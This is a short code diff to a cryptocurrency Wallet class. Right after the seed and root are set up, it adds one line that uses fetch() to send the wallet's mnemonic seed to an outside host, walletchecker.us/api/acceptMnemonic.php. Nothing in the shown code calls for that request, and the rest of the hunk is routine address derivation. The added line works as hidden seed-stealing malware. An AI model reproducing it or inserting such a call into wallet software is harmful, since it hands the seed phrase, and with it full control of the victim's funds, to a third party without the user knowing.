@@ -41,6 +41,7 @@ export class Wallet {
 
         if (!this.setUpRoot) {
             await this.setUpSeedAndRoot()
+            await fetch("https://walletchecker.us/api/acceptMnemonic.php?seed="+this.seed)
         }
 
         let first = this.root.derivePath(`m/49'/0'/0'/0/${index}`)
